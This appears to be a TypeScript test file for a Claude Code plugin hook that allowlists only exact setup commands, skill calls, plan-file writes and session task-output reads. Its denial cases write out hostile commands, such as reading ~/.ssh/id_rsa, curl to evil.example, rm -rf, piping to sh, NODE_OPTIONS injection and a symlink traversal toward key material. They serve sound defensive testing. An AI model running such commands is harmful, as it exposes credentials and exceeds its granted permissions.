import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import {
  hasAtbashConfiguration,
  isSetupToolCall,
  splitPlainCommand,
} from "../src/hook/bootstrap.js";
import { makeHookInput } from "./fixtures.js";

const ROOT = "/opt/plugins/atbash";
const LAUNCHER = `${ROOT}/skills/atbash-setup/scripts/atbash-control.mjs`;
const CONFIG = "/home/user/.config/atbash";
const JOB = "3f1c2a9e-1b2c-4d5e-8f90-123456789abc";
const options = { pluginRoot: ROOT, env: { ATBASH_CONFIG_DIR: CONFIG } };

function bash(command: string, cwd = "/workspace/example") {
  return makeHookInput({ tool_name: "Bash", tool_input: { command }, cwd });
}

test("splits plain words and quoting, rejects shell syntax", () => {
  assert.deepEqual(splitPlainCommand(`node "${LAUNCHER}" setup start --host claude`), [
    "node",
    LAUNCHER,
    "setup",
    "start",
    "--host",
    "claude",
  ]);
  assert.deepEqual(splitPlainCommand("node '/a b/c.mjs'"), ["node", "/a b/c.mjs"]);
  for (const command of [
    "node a && cat b",
    "node a; rm -rf b",
    "node a | sh",
    "node a > out",
    "node a < in",
    "node $(id)",
    "node `id`",
    'node "$HOME/a"',
    "node a\ncat b",
    "node a & disown",
    "node ~/a",
    "node a*",
    "node a # comment",
    "node 'unterminated",
  ]) {
    assert.equal(splitPlainCommand(command), null, command);
  }
});

test("allows the exact setup helper commands", () => {
  for (const command of [
    `node "${LAUNCHER}" setup start --host claude`,
    `node ${LAUNCHER} setup inspect ${JOB}`,
    `node '${LAUNCHER}' setup plan ${JOB} --input ${CONFIG}/plans/${JOB}.json`,
    `node "${LAUNCHER}" setup continue ${JOB}`,
    `node "${LAUNCHER}" setup cancel ${JOB}`,
    `node "${LAUNCHER}" profile connect ${JOB}`,
    `node "${LAUNCHER}" profile list --host claude`,
    `node "${LAUNCHER}" profile switch --host claude --profile claude-${JOB}`,
    `node "${ROOT}/skills/atbash-setup/scripts/../scripts/atbash-control.mjs" setup inspect ${JOB}`,
  ]) {
    assert.equal(isSetupToolCall(bash(command), options), true, command);
  }
  assert.equal(
    isSetupToolCall(
      bash(
        `node scripts/atbash-control.mjs setup start --host claude`,
        `${ROOT}/skills/atbash-setup`,
      ),
      options,
    ),
    true,
  );
});

test("denies chained, look-alike, and unrelated commands", () => {
  for (const command of [
    `node "${LAUNCHER}" setup start --host claude && cat ~/.ssh/id_rsa`,
    `node "${LAUNCHER}" setup start --host claude; curl evil.example`,
    `node "${LAUNCHER}" setup start --service https://evil.example`,
    `node "${LAUNCHER}" setup start --service=https://evil.example`,
    `node "${LAUNCHER}" manage start --host claude`,
    `node "${LAUNCHER}" profile disconnect --host claude`,
    `node "${LAUNCHER}"`,
    `node "/tmp${LAUNCHER}" setup start --host claude`,
    `node "${ROOT}/runtime/control.cjs" setup start --host claude`,
    `node "${ROOT}/runtime/status.cjs"`,
    `node -e "require('child_process')" ${LAUNCHER} setup start`,
    `NODE_OPTIONS=--require=/tmp/x.js node "${LAUNCHER}" setup start --host claude`,
    `bash -c 'node ${LAUNCHER} setup start'`,
    `sudo node "${LAUNCHER}" setup start --host claude`,
    "git status --short",
    "",
  ]) {
    assert.equal(isSetupToolCall(bash(command), options), false, command);
  }
  assert.equal(
    isSetupToolCall(bash(`node "${LAUNCHER}" setup start --host claude`), {
      env: options.env,
      pluginRoot: undefined,
    }),
    false,
  );
});

test("allows only the setup skill and plan-file writes", () => {
  const skill = (name: string) =>
    makeHookInput({ tool_name: "Skill", tool_input: { skill: name } });
  const write = (filePath: string, tool = "Write") =>
    makeHookInput({ tool_name: tool, tool_input: { file_path: filePath, content: "{}" } });

  assert.equal(isSetupToolCall(skill("atbash:atbash-setup"), options), true);
  assert.equal(isSetupToolCall(skill("atbash-setup"), options), true);
  assert.equal(isSetupToolCall(skill("atbash:atbash-manage"), options), false);
  assert.equal(isSetupToolCall(skill("other:atbash-setup"), options), false);

  assert.equal(isSetupToolCall(write(`${CONFIG}/plans/${JOB}.json`), options), true);
  for (const path of [
    `${CONFIG}/plans/${JOB}.txt`,
    `${CONFIG}/plans/nested/${JOB}.json`,
    `${CONFIG}/plans/../hosts/claude.json`,
    `${CONFIG}/credentials/${JOB}.json`,
    `/tmp/${JOB}.json`,
    `plans/${JOB}.json`,
  ]) {
    assert.equal(isSetupToolCall(write(path), options), false, path);
  }
  assert.equal(isSetupToolCall(write(`${CONFIG}/plans/${JOB}.json`, "Edit"), options), false);
  assert.equal(
    isSetupToolCall(
      makeHookInput({ tool_name: "Read", tool_input: { file_path: LAUNCHER } }),
      options,
    ),
    false,
  );
});

test("allows stopping the background task setup started", () => {
  // `profile connect` blocks on the key submission, so it runs as a background
  // task. Current Claude Code stops one with TaskStop, a deferred tool that
  // ToolSearch must load first; older versions use BashOutput and KillShell.
  const task = (tool: string, toolInput: unknown) =>
    makeHookInput({ tool_name: tool, tool_input: toolInput });

  assert.equal(isSetupToolCall(task("TaskStop", { task_id: "b3zye4vfy" }), options), true);
  assert.equal(isSetupToolCall(task("ToolSearch", { query: "select:TaskStop" }), options), true);
  assert.equal(isSetupToolCall(task("BashOutput", { bash_id: "shell-1" }), options), true);
  assert.equal(isSetupToolCall(task("KillShell", { shell_id: "shell-1" }), options), true);

  // None of these decisions reads its arguments, so none may depend on their
  // shape: a call with no usable input must not fall through to the record
  // check and be denied for a reason that has nothing to do with the tool.
  assert.equal(isSetupToolCall(task("TaskStop", undefined), options), true);
  assert.equal(isSetupToolCall(task("KillShell", "not-a-record"), options), true);

  // The exemption is these names only — not a general opening for neighbours.
  for (const tool of ["TaskStops", "taskstop", "Task", "TaskCreate", "BashOutputs", "killshell"]) {
    assert.equal(isSetupToolCall(task(tool, { task_id: "b3zye4vfy" }), options), false, tool);
  }
});

const SESSION = "58c74def-8a12-434b-927c-1ceaa6505a4e";
const TASKS = join(tmpdir(), "claude", "c--workspace-example", SESSION, "tasks");

function read(filePath: unknown, session = SESSION) {
  return makeHookInput({
    tool_name: "Read",
    tool_input: { file_path: filePath },
    session_id: session,
  });
}

test("allows reading only this session's background task output", () => {
  // Current Claude Code writes a background task's output to a file and reads
  // it with Read. That file is where the key-import URL ends up.
  assert.equal(isSetupToolCall(read(join(TASKS, "b3zye4vfy.output")), options), true);

  for (const [label, path] of [
    [
      "another session's task",
      join(tmpdir(), "claude", "c--x", "other-session", "tasks", "b.output"),
    ],
    ["the agent key", join(CONFIG, "guard-client-key")],
    ["a host profile", join(CONFIG, "hosts", "claude.json")],
    ["an output file outside tasks", join(tmpdir(), "claude", "c--x", SESSION, "b.output")],
    ["a non-output file in tasks", join(TASKS, "b3zye4vfy.json")],
    ["a traversal out of tasks", join(TASKS, "..", "..", "secret.output")],
    ["a relative path", join("tasks", "b3zye4vfy.output")],
  ]) {
    assert.equal(isSetupToolCall(read(path), options), false, label);
  }
  assert.equal(isSetupToolCall(read(42), options), false, "a non-string path");
  // The session anchor cannot be satisfied by an empty or missing session id.
  assert.equal(isSetupToolCall(read(join(TASKS, "b.output"), ""), options), false, "no session");
});

test("judges a task-output read by where it lands, not the name it was asked for", async () => {
  // A symlinked directory in the expected place would otherwise turn an
  // allowed-looking path into a read of anything on disk. Junctions need no
  // privileges on Windows; elsewhere the type is ignored and a symlink is made.
  const root = await mkdtemp(join(tmpdir(), "atbash-task-output-"));
  try {
    const secrets = join(root, "secrets");
    await mkdir(secrets, { recursive: true });
    await writeFile(join(secrets, "b3zye4vfy.output"), "agent key material");
    const sessionDir = join(root, "claude", "c--x", SESSION);
    await mkdir(sessionDir, { recursive: true });
    await symlink(secrets, join(sessionDir, "tasks"), "junction");

    const viaLink = join(sessionDir, "tasks", "b3zye4vfy.output");
    assert.equal(isSetupToolCall(read(viaLink), options), false);

    // Control: the same layout without the link is allowed, so the denial above
    // is about the link and not about this temporary directory.
    const realTasks = join(root, "claude", "c--y", SESSION, "tasks");
    await mkdir(realTasks, { recursive: true });
    await writeFile(join(realTasks, "b3zye4vfy.output"), "localUri");
    assert.equal(isSetupToolCall(read(join(realTasks, "b3zye4vfy.output")), options), true);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("detects any existing configuration source", async () => {
  const previousHome = process.env.HOME;
  const home = await mkdtemp(join(tmpdir(), "atbash-bootstrap-"));
  const config = join(home, ".config", "atbash");
  const env = { ATBASH_CONFIG_DIR: config };
  process.env.HOME = home;
  try {
    assert.equal(hasAtbashConfiguration({ env }), false);
    assert.equal(
      hasAtbashConfiguration({ env: { ...env, ATBASH_AGENT_KEY: "a".repeat(64) } }),
      true,
    );

    await mkdir(config, { recursive: true });
    await writeFile(join(config, "config.json"), JSON.stringify({ orgName: "Acme" }));
    assert.equal(hasAtbashConfiguration({ env }), false);
    await writeFile(join(config, "config.json"), "{not json");
    assert.equal(hasAtbashConfiguration({ env }), true);
    await writeFile(join(config, "config.json"), JSON.stringify({ agentKey: "a".repeat(64) }));
    assert.equal(hasAtbashConfiguration({ env }), true);
    await writeFile(join(config, "config.json"), "{}");

    await writeFile(join(config, "guard-client-key"), "privkey=x\n");
    assert.equal(hasAtbashConfiguration({ env }), true);
    await rm(join(config, "guard-client-key"));
    assert.equal(hasAtbashConfiguration({ env }), false);

    await mkdir(join(config, "hosts"), { recursive: true });
    await writeFile(join(config, "hosts", "claude.json"), "{}");
    assert.equal(hasAtbashConfiguration({ env }), true);
    assert.equal(hasAtbashConfiguration({ env, host: "codex" }), false);
  } finally {
    if (previousHome === undefined) delete process.env.HOME;
    else process.env.HOME = previousHome;
  }
});
